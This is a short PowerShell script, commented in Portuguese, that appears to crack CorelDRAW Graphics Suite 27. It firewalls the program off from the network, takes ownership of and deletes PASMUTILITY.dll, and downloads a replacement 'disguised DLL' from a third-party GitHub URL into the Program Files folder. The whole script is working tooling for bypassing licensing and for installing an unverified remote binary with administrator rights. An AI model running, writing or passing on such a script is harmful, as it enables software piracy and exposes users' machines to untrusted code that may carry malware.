# URL direta para a DLL disfarçada
$urlBin = "https://github.com/dayvson009/poneyrosa/raw/refs/heads/main/27.bin"

$caminhoCorel = "$env:ProgramFiles\Corel\PASMUtility\v1"
$destino = "$caminhoCorel\PASMUTILITY.dll"
$exeCorel = "$env:ProgramFiles\Corel\CorelDRAW Graphics Suite\27\Programs64\CorelDRW.exe"

# 1. Firewall (Ações que exigem Admin)
netsh advfirewall firewall add rule name="Corel27_Block_Out" dir=out action=block program="$exeCorel" enable=yes
netsh advfirewall firewall add rule name="Corel27_Block_In" dir=in action=block program="$exeCorel" enable=yes

# 2. Processo de Patch
if (Test-Path $caminhoCorel) {
    if (Test-Path $destino) {
        Set-ItemProperty $destino -Name IsReadOnly -Value $false
        takeown /f $destino /a > $null
        icacls $destino /grant "Administrators:F" > $null
        Remove-Item $destino -Force -ErrorAction SilentlyContinue
    }

    try {
        Invoke-WebRequest -Uri $urlBin -OutFile $destino -MaximumRedirection 5 -ErrorAction Stop
        if (Test-Path $destino) { Write-Host "Sucesso" }
    } catch {
        Write-Host "Erro_Download"
    }
} else {
    Write-Host "Pasta_Nao_Encontrada"
}
